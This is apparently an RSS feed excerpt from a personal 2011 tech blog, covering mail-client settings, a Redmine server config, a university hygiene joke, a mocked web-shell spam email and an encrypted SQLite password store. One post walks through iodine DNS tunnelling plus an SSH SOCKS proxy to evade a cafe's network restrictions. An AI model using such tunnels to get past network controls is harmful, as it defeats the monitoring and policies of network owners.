    <item>
      <title>Need any sh3ll?</title>
      <link>https://blog.dornea.nu/2011/12/19/need-any-sh3ll/</link>
      <pubDate>Mon, 19 Dec 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/12/19/need-any-sh3ll/</guid>
      <content:encoded><![CDATA[<p>Received from Mr.Sh3ll:</p>
<blockquote>
<p>hi.my name is saied. if u permit.i want upload shell in ur site for access from another site on this server. i promise dont damage ur site if u accept. send email to me.and i will send u shell and u upload. dont worry</p>
</blockquote>
<p>WTF?</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Add Namecheap Mail account (OX Mail) to Thunderbird</title>
      <link>https://blog.dornea.nu/2011/11/30/add-namecheap-mail-account-ox-mail-to-thunderbird/</link>
      <pubDate>Wed, 30 Nov 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/11/30/add-namecheap-mail-account-ox-mail-to-thunderbird/</guid>
      <content:encoded><![CDATA[<p>I thought this could be useful for other Namecheap customers. <code>'Namecheap</code>&rsquo;s Open-Xchange servers use only <code>'secure</code>' connnections (STARTTLS, SSL/TLS). Supposing <code>domain.com</code> is the domain you have purchased, you&rsquo;ll have to configure Thunderbird using these settings:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">; Username  
: your email address (@domain.com)  
; Password  
: password you have set in the Namecheap configuration menu  
; Incoming/outgoing servers  
: oxmail.registrar-servers.com  
; Incoming server type  
: IMAP or POP3  
; Outgoing server (SMTP)  
: 465 port for SSL, 25 or 26 for TLS  
; Incoming server (IMAP)  
: 993 port for SSL, 143 for TLS  
; Incoming server (POP3)  
: 995 port for SSL 110 for TLS
</code></pre></div><p>That should do the work. I use POP3 with SSL/TLS (Port: 995). Be sure you use <code>'Normal password</code>' as <code>authentication method</code>. VoilaÂ !</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Die stinkenden Informatiker</title>
      <link>https://blog.dornea.nu/2011/11/12/die-stinkenden-informatiker/</link>
      <pubDate>Sat, 12 Nov 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/11/12/die-stinkenden-informatiker/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2011/263/eintritt_nur_geduscht.jpg" alt="Eintritt nur geduscht"></p>
<p>Ich musste das verÃ¶ffentlichen. Ich habe mir gestern einen abgelacht. Lest euch das selber durch:</p>
<blockquote>
<p>Hallo liebe Studenten,</p>
<p>die Tage werden kÃ¼rzer und auch kÃ¤lter. Leider haben einige unserer Studenten anscheinend die unschÃ¶ne Angewohnheit sich nur dann zu waschen, wenn sie merken, dass sie es nÃ¶tig hÃ¤tten. Im Gegensatz zu den heiÃŸen Sommertagen merkt man das persÃ¶nlich im Winter natÃ¼rlich weniger, was jedoch nicht bedeutet, dass es andere im Umfeld nicht bemerken - zum Beispiel durch den leicht beiÃŸenden Geruch in vollen Vorlesungs- oder Tutorienveranstaltungen.</p>
<p>Meine Bitte an diejenigen, die das betrifft: Nehmt bitte RÃ¼cksicht auf eure Mitstudenten und achtet doch etwas mehr auf eure KÃ¶perhygiene. Das sorgt auch gleich fÃ¼r ein besseres Lernklima.</p>
<p>Ich bedanke mich.<br>
GruÃŸ</p>
</blockquote>
<h2 id="update-2011-11-14">[Update 2011-11-14]</h2>
<blockquote>
<p>Hi liebe Studenten,</p>
<p>vor paar Tagen hat sich Hr. Andre Stern zu dem Thema Geruch in den Vorlesungs- oder Tutorienveranstaltungen geÃ¤uÃŸert. Da einige von uns es wirklich als ein groÃŸes Problem sehen, versuchen wir eine LÃ¶sung zu finden, die weder den beteiligten noch den mitleidenden zur Last fallen soll und deren Lebensweise bzw. -gewohnheiten nicht zwangslÃ¤ufig verÃ¤ndern soll.</p>
<p>Vorschlag 1: Je nach MÃ¶glichkeit Ã¶ffnen wir in der Pause bzw. zwischen zwei Veranstaltungen die Fenster um durch zu lÃ¼ften, aber jedoch lÃ¶st es nicht das Problem direkt wÃ¤hrend der Veranstaltung.</p>
<p>Vorschlag 2: Jeder gibt ein Cent, dann kaufen wir von dem eingesammelten Geld DeoSpray, was die Leute bei unangenehmen GerÃ¼chen evtl benutzen kann. Platziert werden diese im FachbereichgebÃ¤ude am Waschbecken.</p>
<p>Falls ihr noch einen besseren oder interessanten Vorschlag habt, lasst uns wissen.</p>
<p>Ich bedanke mich.</p>
<p>schÃ¶nen GruÃŸ</p>
</blockquote>
<p>Und die Antwort darauf:</p>
<blockquote>
<p>Vorschlag 1, gut - sollte sowieso gemacht werden allein wegen Sauerstoff.<br>
Vorschlag 2&hellip;<br>
Vorschlag 3: habt den Arsch inner Hose auf die Leute zuzugehen, die fÃ¼r euch unangenehme GerÃ¼che verbreiten - kann mir nich vorstellen, dass jmd absichtlich blÃ¶d riecht ;)</p>
</blockquote>
<h2 id="update-2011-11-15">[Update 2011-11-15]</h2>
<p>So damit wir endlich wieder unsere Ruhe finden. Hier meine ergÃ¤nzenden<br>
VorschlÃ¤ge. Der Rest sollte in einem Forum diskutiert werden und nicht<br>
Ã¼ber den Verteiler &hellip;<br>
<a href="https://foren.spline.inf.fu-berlin.de/viewforum.php?f=2">https://foren.spline.inf.fu-berlin.de/viewforum.php?f=2</a></p>
<p>Da kÃ¶nnen wir ganz viel zusammentragen ohne allen anderen auf die Nerven<br>
zu gehen.</p>
<h3 id="vorschlag-3">Vorschlag 3:</h3>
<p>Wir sind nicht so etepetete und ertragen das ganze einfach. Habe schon<br>
fast 10 Semester aufm Buckel und man kann damit leben &hellip;</p>
<h3 id="vorschlag-4">Vorschlag 4:</h3>
<p>Wir reden direkt mit den Leuten nach dem Tutorium / Veranstaltung. Das<br>
bedeutet diskret und ohne diese bloss zu stellen.</p>
<h3 id="vorschlag-5">Vorschlag 5:</h3>
<p>Wir hÃ¤ngen DuftbÃ¤ume in den RÃ¤umen auf.</p>
<h3 id="vorschlag-6">Vorschlag 6:</h3>
<p>Wir reden ganz viel, machen viel Stress, tun aber gar nichts</p>
<h3 id="vorschlag-7">Vorschlag 7:</h3>
<p>Wir schicken eine Duschanleitung / Hygieneguide per Email durch den<br>
Verteiler</p>
<h3 id="vorschlag-8">Vorschlag 8:</h3>
<p>Wir machen saubere und dreckige Tutorien, dann kann jeder hingehen wo er sich wohl fÃ¼hlt.</p>
<h3 id="vorschlag-9">Vorschlag 9:</h3>
<p>Wir zeichnen Vorlesungen auf, dann kann man sich diese von Zuhause angucken.</p>
<h3 id="vorschlag-10">Vorschlag 10:</h3>
<p>Wir gucken ob es in anderen Fachbereichen genauso stinkt und starten eine<br>
Studie Ã¼ber das Problem. AnschlieÃŸend kommen wir zu dem Schluss, dass es<br>
an der MÃ¤nnerquote liegt und sorgen fÃ¼r mehr Frauen in der Informatik. Das<br>
macht alle glÃ¼cklich.</p>
<h3 id="vorschlag-11">Vorschlag 11:</h3>
<p>Wenn das Tutorium stinkt, schreibt dies der Tutor an die Tafel, verlÃ¤sst<br>
das Tutorium und es fÃ¤llt aus. Gleiches gilt fÃ¼r Vorlesungen.</p>
<h3 id="vorschlag-12">Vorschlag 12:</h3>
<p>Mindestalter fÃ¼r das Informatikstudium wird auf 23 erhÃ¶ht. Wenn das nicht<br>
wirkt schrittweise weiter erhÃ¶hen.</p>
<h3 id="vorschlag-13">Vorschlag 13:</h3>
<p>Wir schicken die Stinker an die TU &hellip; sollen die doch sehen wie die damit zurecht kommen. Dahlem hat so einen Gestank nicht verdient.</p>
<h3 id="vorschlag-14">Vorschlag 14:</h3>
<p>Wir machen eine Institutsweite Abstimmung, welcher Vorschlag durchgesetzt<br>
werden soll. evtl. ja mehrere.</p>
<h3 id="vorschlag-15">Vorschlag 15:</h3>
<p>Die Top 5 der Stinker kommt an einem Pranger (Liste mit Namen und Foto an Pinnwand) &hellip; das hat schon im Mittelalter geholfen.</p>
<h3 id="vorschlag-16">Vorschlag 16:</h3>
<p>Wir fragen andere UniversitÃ¤ten / Informatikfachbereiche wie diese die<br>
Stinker in den Griff bekommen haben.</p>
<h3 id="vorschlag-17">Vorschlag 17:</h3>
<p>Taschenkontrolle am Eingang, wer kein Deo dabei hat, wird nicht reingelassen.</p>
<h3 id="vorschlag-18">Vorschlag 18:</h3>
<p>Wir sammeln einen Cent von jedem Student und kaufen davon Nasenklammern<br>
fÃ¼r alle Softies.</p>
<h3 id="vorschlag-19">Vorschlag 19:</h3>
<p>Wir zÃ¼nden RÃ¤ucherstÃ¤bchen an und verwandeln den Fachbereich in einen Ort<br>
des Wohlriechens und sind immun gegen alle anderen GerÃ¼che.</p>
<h3 id="vorschlag-20">Vorschlag 20:</h3>
<p>Wir installieren Stinkdetektoren, die Alarm schlagen, sobald SchweiÃŸ oder<br>
Gestank wahrgenommen wird. Besonders interessant im Tischtennisraum, um zu<br>
erkennen, wenn jemand unverschÃ¤mt unverhÃ¤ltnismÃ¤ÃŸig lange gespielt hat.</p>
<h3 id="vorschlag-21">Vorschlag 21:</h3>
<p>Wir installieren Duschen in den Unis und lassen Unierst ab 10 Uhr starten,<br>
dann hat man genug Zeit in der Uni nach der Ankunft noch zu Duschen.<br>
Vielleicht ist man ja Fahrrad gefahren!</p>
<h3 id="vorschlag-22">Vorschlag 22:</h3>
<p>Wer stinkt muss die Tafel fÃ¼r den Tutor wischen.</p>
<p>Freundliche GrÃ¼ÃŸe an alle Trolle</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Thank God there is iodine! IPv4 over DNS</title>
      <link>https://blog.dornea.nu/2011/11/09/thank-god-there-is-iodine-ipv4-over-dns/</link>
      <pubDate>Wed, 09 Nov 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/11/09/thank-god-there-is-iodine-ipv4-over-dns/</guid>
      <content:encoded><![CDATA[<p>I always knew DNS/ICMP traffic is mostly allowed and un-monitored. It was about time to setup some DNS server on my vServer which would allow me to break free! Thanks God there is <a href="http://code.kryo.se/iodine/">iodine</a> which allows you to route IP traffic over DNS.</p>
<p>I was recently at some cafe and thought it would be a great ideea to test my configuration. I&rsquo;ve setup the iodine server a few weeks before.This is what I did:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># iodine -fP (insert password here) *.*136.116 *.mooo.com
Opened dns0
Opened UDP socket
Sending DNS queries for tunnel.syngres.mooo.com to *.*.136.116
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 10.0.0.2
Setting MTU of dns0 to 1130
Server tunnel IP is 10.0.0.1
Testing raw UDP data to the server (skip with -r)
Server is at 178.77.98.100, trying raw login: ....failed
Using EDNS0 extension
Switching upstream to codec Base128
Server switched upstream to codec Base128
No alternative downstream codec available, using default (Raw)
Switching to lazy mode for low-latency
Server switched to lazy mode
Autoprobing max downstream fragment size... (skip with -m fragsize)
768 ok.. ...1152 not ok.. 960 ok.. ...1056 not ok.. 1008 ok.. 1032 ok.. 1044 ok.. will use 1044-2=1042
Setting downstream fragment size to max 1042...
Connection setup complete, transmitting data.
</code></pre></div><p>Then setup the SSH connection:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># ssh -CD 9999 user@10.0.0.1 -p 1337
</code></pre></div><p>This will create a <strong>local socket</strong> which can be used for further connections.</p>
<h2 id="traffic-redirection">Traffic redirection</h2>
<p>I use <strong>proxychains</strong> (but there is also socat, socksify, tsocks etc.) for traffic redirection. Simply add 127.0.0.1:9999 to your /etc/proxychains.conf and you&rsquo;ll have your desired traffic control.</p>
<h2 id="screenshots">Screenshots</h2>
<p><img src="/posts/img/2011/261/iodine1.png" alt=""></p>
<p><img src="/posts/img/2011/261/iodine2.png" alt=""></p>
<p><img src="/posts/img/2011/261/iodine3.png" alt=""></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Redmine, Lighttpd with Debian</title>
      <link>https://blog.dornea.nu/2011/11/07/howto-redmine-lighttpd-with-debian/</link>
      <pubDate>Mon, 07 Nov 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/11/07/howto-redmine-lighttpd-with-debian/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ll just post my <code>lighttpd.conf</code>. The rest can be easily found on the Internet.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$HTTP[&#34;host&#34;] =~ &#34;^dev.dornea.nu$&#34; {
        evhost.path-pattern = &#34;/home/redmine/current/public&#34;
        server.follow-symlink = &#34;enable&#34;
        
        server.indexfiles = ( &#34;dispatch.fcgi&#34; )
        server.error-handler-404 = &#34;/dispatch.fcgi&#34;

        #dir-listing.activate = &#34;enable&#34;
        
        url.rewrite-once = (
            &#34;^/(.*..+(?!html))$&#34; =&amp;gt; &#34;$0&#34;,
            &#34;^/(.*).(.*)&#34;        =&amp;gt; &#34;$0&#34;,
        )
 
        fastcgi.server      = ( &#34;.fcgi&#34; =&amp;gt; ( &#34;redmine&#34; =&amp;gt; (
                &#34;min-procs&#34;       =&amp;gt; 1,
                &#34;max-procs&#34;       =&amp;gt; 5,
                &#34;socket&#34; =&amp;gt; &#34;/tmp/redmine.socket&#34;,
                &#34;bin-path&#34; =&amp;gt; &#34;/usr/bin/ruby /home/redmine/current/public/dispatch.fcgi&#34;,
                &#34;bin-environment&#34; =&amp;gt; ( &#34;RAILS_ENV&#34; =&amp;gt; &#34;production&#34; )
        ) ) )

    }
</code></pre></div><p>My redmine installation can be found under <strong>/home/redmine/current</strong></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Keep your passwords safe using SQLite and SQLCipher</title>
      <link>https://blog.dornea.nu/2011/07/28/howto-keep-your-passwords-safe-using-sqlite-and-sqlcipher/</link>
      <pubDate>Thu, 28 Jul 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/07/28/howto-keep-your-passwords-safe-using-sqlite-and-sqlcipher/</guid>
      <content:encoded><![CDATA[<p>I was recently doing some hacks and realized that there must be a way to store gained information in a secure manner. I usually encrypt sensitive information (like passwords, accounts etc.) using GPG. But that&rsquo;s quite unhandy: You always need your private key and the encrypted data is stored unencrypted on the device (unless you&rsquo;re using full disk encryption which shouldn&rsquo;t be a problem since data is stored encrypted on the device). Like you probably also do, I have several account types: Mail, SSH, FTP, LDAP etc. Finding a good structure to store all that information could be a headache. Besides that you usually have several <code>organizations</code> offering specific services: Firm A offers Service 1 and Service 2; Firm B also offers Service 1 but on different port and so on&hellip;</p>
<p>Pondering about all this stuff, I came up with an idea which might be useful to some of you: Relational Database Management Systems (RDBMS). The concept should be able to:</p>
<ul>
<li>store ALL information in ONE place</li>
<li>provide simple functionalities in order to ADD, DELETE, MODIFY data</li>
<li>encrypt ALL data</li>
</ul>
<p>Well these are the requirements. What about real-life tools to satisfy them?</p>
<h2 id="sqlite">SQLite</h2>
<blockquote>
<p>&ldquo;SQLite is a software library that implements a self-contained, serverless, zero-configuration, transactional SQL database engine. SQLite is the most widely deployed SQL database engine in the world. The source code for SQLite is in the public domain.&rdquo; (Source: <a class="http" href="http://www.sqlite.org"><a href="http://www.sqlite.org">http://www.sqlite.org</a></a>)</p>
</blockquote>
<p>What does this mean?</p>
<ul>
<li>We got relations! Enjoy the magic of simple SQL queries.</li>
<li>No configuration! You don&rsquo;t have to configure any server nor the SQL client. Just create the DB and you&rsquo;re done.</li>
<li>The data base is stored in ONE file.</li>
<li>You can have multiple data bases within each file.</li>
</ul>
<p>Pretty much for a DB! The really cool thing about SQLite is the fact that there are no additional steps required in order to create and maintain the DB. I really like PostgreSQL/MySQL &amp; Co. but the whole configuration process is driving me nuts. With SQLite you just create the file, put some schema to it and you&rsquo;re done. Last but not least: It&rsquo;s fast! Although the document is outdated you could have a look at the speed comparsion <a class="http" href="http://www.sqlite.org/speed.html">here</a>.</p>
<h2 id="database-schema">Database schema</h2>
<p>Now let&rsquo;s have a closer look at the interna of our DB. Let&rsquo;s start with the simplest table: the <strong>organization</strong> table.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TABLE</span><span style="color:#666"> </span><span style="color:#ed9d13">&#34;organization&#34;</span><span style="color:#666"> </span>(<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;id&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">PRIMARY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;name&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span><span style="color:#666">
</span><span style="color:#666"></span>);<span style="color:#666">
</span></code></pre></div><p>That should do the job since you need only the organizations name and some primary key. Usually an organization offers serveral services. So we&rsquo;ll create the 2nd table: the <strong>service</strong> table.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TABLE</span><span style="color:#666"> </span><span style="color:#ed9d13">&#34;service&#34;</span><span style="color:#666"> </span>(<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;id&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">PRIMARY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;host&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;port&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#ed9d13">&#34;organization_id&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">    </span><span style="color:#6ab825;font-weight:bold">CONSTRAINT</span><span style="color:#666"> </span>fk_service_organization_id<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FOREIGN</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span>(organization_id)<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REFERENCES</span><span style="color:#666"> </span><span style="color:#447fcf">organization</span>(id)<span style="color:#666">
</span><span style="color:#666"></span>);<span style="color:#666">
</span></code></pre></div><p>Assuming we have <code>Firm A</code> in our organization table, then its services will be stored in this way:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sqlite&gt; SELECT * FROM organization;
id          name
----------  ----------
1           Firm A

sqlite&gt; SELECT * FROM service;
id          host         port        organization_id
----------  -----------  ----------  ---------------
1           smtp.a.com   25          1
</code></pre></div><p>I think you got the point. You&rsquo;ll need a PK (primary key) , a host (actually this should be called <code>url</code>), a port number and the organization ID offering the service.</p>
<p>By now the schema was quite simple. We got the organization and its services. The <strong>account</strong> will interfere with both of them. First let&rsquo;s have a look the table:</p>
</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.sql" data-lang=".sql"><span style="color:#6ab825;font-weight:bold">CREATE</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TABLE</span><span style="color:#666"> </span><span style="color:#ed9d13">&#34;account&#34;</span><span style="color:#666"> </span>(<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;id&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">PRIMARY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;created&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;expires&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;user&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;passwd&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">TEXT</span>,<span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#ed9d13">&#34;service_id&#34;</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">INTEGER</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">NOT</span><span style="color:#666"> </span><span style="color:#40ffff">NULL</span>,<span style="color:#666">
</span><span style="color:#666">
</span><span style="color:#666">        </span><span style="color:#6ab825;font-weight:bold">CONSTRAINT</span><span style="color:#666"> </span>fk_account_service_id<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">FOREIGN</span><span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">KEY</span><span style="color:#666"> </span>(service_id)<span style="color:#666"> </span><span style="color:#6ab825;font-weight:bold">REFERENCES</span><span style="color:#666"> </span><span style="color:#447fcf">service</span>(id)<span style="color:#666">
</span><span style="color:#666"></span>);<span style="color:#666">
</span></code></pre></div><p>I think the attributes are self-explanatory. Here are some sample entries:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sqlite&gt; SELECT * FROM accounts;
id          created     expires     user                    passwd      host         port
----------  ----------  ----------  ----------------------  ----------  -----------  ----------
1           2011-07-23  2012-07-26  victor.dorneanu@blab    XXXXXX      smtp.kjs.de  25
2           2011-07-23  2012-07-26  victor.dorneanu@bla2    XXXXXX      pop3.kjs.de  995
3           2011-07-23  2012-07-26  victor@gmail            XXXXXX      smtp.gmail.  25
</code></pre></div><h2 id="entity-relationship-modell">Entity-Relationship-Modell</h2>
<p>This is for the ER-Modell freaks among you&hellip;</p>
<p><img src="/posts/img/2011/255/er-modell.png" alt="ER model"></p>
<p>Graphviz code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">graph ER {
    node [shape=box, style=filled, color=yellow]; organization; service; account;
    node [shape=ellipse, style=filled, color=green]; acc_id; created; expires; user; passwd; org_id; org_name; serv_id; host;
    port;
    node [shape=diamond,style=filled,color=lightgrey]; {node [label=&#34;has&#34;] has0;
    has1;}

    organization -- org_id;
    organization -- org_name;

    account -- acc_id;
    account -- created;
    account -- expires;
    account -- user;
    account -- passwd;

    service -- serv_id;
    service -- host;
    service -- port;

    organization -- &#34;has0&#34; [label=&#34;M&#34;,len=1.00];
    &#34;has0&#34; -- service [label=&#34;N&#34;,len=1.00];

    service -- &#34;has1&#34; [label=&#34;1&#34;,len=1.00];
    &#34;has1&#34; -- account [label=&#34;N&#34;,len=1.00];

    label = &#34;

ER Modell (dornea.nu)&#34;;
    fontsize=9;
}
</code></pre></div><h2 id="security">Security</h2>
<p>Ok. So we got our DB, our tables and inserted some dummy data. What about security? What if our SQLite file gets in the wrong hands? <a class="http" href="http://sqlcipher.net/">SQLCipher</a> could help us to minimize the potential impact. What is it?</p>
<blockquote>
<p>&ldquo;SQLCipher is an SQLite xtension that provides transparent 256-bit AES encryption of database files. Pages are encrypted before being written to disk and are decrypted when read back. Due to the small footprint and great performance itâ€™s ideal for protecting embedded application databases and is well suited for mobile development.&rdquo;&quot; (Source: <a class="http" href="http://sqlcipher.net/"><a href="http://sqlcipher.net/">http://sqlcipher.net/</a></a>)</p>
</blockquote>
<p>Advantages:</p>
<ul>
<li>EVERYTHING is encrypted</li>
<li>you have a small percentage of overhead (for encryption routines): 5-15%</li>
<li>uses OpenSSL crypto library</li>
<li>good security (CBC mode, key derivation)</li>
</ul>
<p>In order to use SQLCipher you&rsquo;ll have to build the SQLite package with the enhanced features. Just follow the instructions on <a class="http" href="http://sqlcipher.net/introduction/"><a href="http://sqlcipher.net/introduction/">http://sqlcipher.net/introduction/</a></a> and use following command to configure and build the package:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">./configure --prefix=/usr/local --enable-tempstore=yes CFLAGS=&#34;-DSQLITE_HAS_CODEC&#34; LDFLAGS=&#34;-lcrypto&#34;
make
make install
</code></pre></div><p>Then you should have a working binary in /usr/local/bin. I suggest you create a new encrypted DB rather than encrypt an existing one. There are several <a class="http" href="http://sqlcipher.net/sqlcipher-api/">hints</a> how to do this, but I recommend you starting with a new fresh DB. Let&rsquo;s get started:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/local/bin/sqlite3 new_db.db
SQLite version 3.7.2
Enter &#34;.help&#34; for instructions
Enter SQL statements terminated with a &#34;;&#34;
sqlite&gt; PRAGMA key = &#39;crackme&#39;;
sqlite&gt; PRAGMA cipher = &#39;aes-256-cfb&#39;;
sqlite&gt; PRAGMA kdf_iter = &#39;1000&#39;;
sqlite&gt;
</code></pre></div><p>Now you&rsquo;re ready to create your DB schema. I&rsquo;d create some SQL file, set the DB key and afterwards create the table. Create some new file (e.g. dump.sql) and paste these line to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">PRAGMA key = &#39;crackme&#39;;
PRAGMA cipher = &#39;aes-256-cfb&#39;;
PRAGMA kdf_iter = &#39;1000&#39;;
BEGIN TRANSACTION;
-- CREATE Tables
CREATE TABLE &#34;organization&#34; (
    &#34;id&#34; INTEGER PRIMARY KEY NOT NULL,
    &#34;name&#34; TEXT NOT NULL
);

CREATE TABLE &#34;service&#34; (
    &#34;id&#34; INTEGER PRIMARY KEY NOT NULL,
    &#34;host&#34; TEXT NOT NULL,
    &#34;port&#34; INTEGER NOT NULL,
    &#34;organization_id&#34; INTEGER NOT NULL,

    CONSTRAINT fk_service_organization_id FOREIGN KEY (organization_id) REFERENCES organization(id)
);

CREATE TABLE &#34;account&#34; (
        &#34;id&#34; INTEGER PRIMARY KEY NOT NULL,
        &#34;created&#34; TEXT NOT NULL,
        &#34;expires&#34; TEXT NOT NULL,
        &#34;user&#34; TEXT NOT NULL,
        &#34;passwd&#34; TEXT,
        &#34;service_id&#34; INTEGER NOT NULL,

        CONSTRAINT fk_account_service_id FOREIGN KEY (service_id) REFERENCES service(id)
);

END TRANSACTION;
</code></pre></div><p>Then create your encrypted DB using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/local/bin/sqlite3 -init dump.sql encrypted.db
SQLite version 3.7.2
Enter &#34;.help&#34; for instructions
Enter SQL statements terminated with a &#34;;&#34;
sqlite&gt; .tables
account       organization  service
sqlite&gt;
</code></pre></div><p>Voila! Is the file <code>encrypted.db</code> really encrypted? Let&rsquo;s have a look:</p>
